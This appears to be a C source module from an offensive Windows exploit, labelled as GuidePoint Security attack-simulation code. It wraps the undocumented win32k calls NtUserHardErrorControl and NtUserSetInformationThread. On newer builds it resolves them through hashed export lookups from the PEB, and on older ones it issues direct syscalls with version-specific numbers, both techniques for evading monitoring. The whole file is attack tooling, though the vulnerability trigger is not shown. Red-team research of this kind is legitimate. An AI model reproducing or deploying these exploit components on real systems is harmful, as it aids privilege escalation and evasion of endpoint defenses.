/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

NTSTATUS
NtUserSetInformationThread(
	_In_ HANDLE Thread,
	_In_ USERTHREADINFOCLASS ThreadInfoClass,
	_In_ PVOID ThreadInformation,
	_In_ ULONG ThreadInformationLength
);

NTSTATUS
NtUserHardErrorControl(
	_In_ HARDERRORCONTROL Command,
	_In_ HANDLE Thread,
	_In_ PDESKTOPRESTOREDATA DesktopRestore
);

typedef struct
{
	D_API( NtUserSetInformationThread );
	D_API( NtUserHardErrorControl );
} API ;

#define H_API_NTUSERSETINFORMATIONTHREAD	0xd4bc0b70 /* NtUserSetInformationThread */
#define H_API_NTUSERHARDERRORCONTROL		0xd8eea850 /* NtUserHardErrorControl */
#define H_LIB_WIN32U				0x9968d8d7 /* win32u.dll */

/*!
 *
 * Purpose:
 *
 * Executes NtUserHardErrorControl depending on the
 * operating system version.
 *
!*/

D_SEC( E ) NTSTATUS NtUserHardErrorControlCall( _In_ HARDERRORCONTROL Command, _In_ HANDLE Thread, _Out_ PDESKTOPRESTOREDATA DesktopRestore )
{
	API	Api;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	if ( NtCurrentPeb()->OSBuildNumber >= 14393 ) 
	{
		Api.NtUserHardErrorControl = PeGetFuncEat( PebGetModule( H_LIB_WIN32U ), H_API_NTUSERHARDERRORCONTROL ); return 
			Api.NtUserHardErrorControl( Command, Thread, DesktopRestore );
	} else 
	{
		switch ( NtCurrentPeb()->OSBuildNumber ) 
		{
			case 7600:
			case 7601:
				return SystemCall( 4812, Command, Thread, DesktopRestore );
			case 9200:
				return SystemCall( 4943, Command, Thread, DesktopRestore );
			case 9600:
				return SystemCall( 4986, Command, Thread, DesktopRestore );
			case 10240:
				return SystemCall( 5058, Command, Thread, DesktopRestore );
			case 10586:
				return SystemCall( 5062, Command, Thread, DesktopRestore );
		};
	};
};

/*!
 *
 * Purpose:
 *
 * Executes NtUserSetInformationThread depending on the
 * operating system version.
 *
!*/

D_SEC( E ) NTSTATUS NtUserSetInformationThreadCall( _In_ HANDLE Thread, _In_ USERTHREADINFOCLASS ThreadInfoClass, PVOID ThreadInformation, ULONG ThreadInformationLength )
{
	API	Api;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	if ( NtCurrentPeb()->OSBuildNumber >= 14393 ) 
	{
		Api.NtUserSetInformationThread = PeGetFuncEat( PebGetModule( H_LIB_WIN32U ), H_API_NTUSERSETINFORMATIONTHREAD ); return 
			Api.NtUserSetInformationThread( Thread, ThreadInfoClass, ThreadInformation, ThreadInformationLength );
	} else 
	{
		switch ( NtCurrentPeb()->OSBuildNumber ) 
		{
			case 7600:
			case 7601:
			case 9200:
				return SystemCall( 4321, Thread, ThreadInfoClass, ThreadInformation, ThreadInformationLength );
			case 9600:
				return SystemCall( 4322, Thread, ThreadInfoClass, ThreadInformation, ThreadInformationLength );
			case 10240:
			case 10586:
				return SystemCall( 4323, Thread, ThreadInfoClass, ThreadInformation, ThreadInformationLength );
		};
	};
};
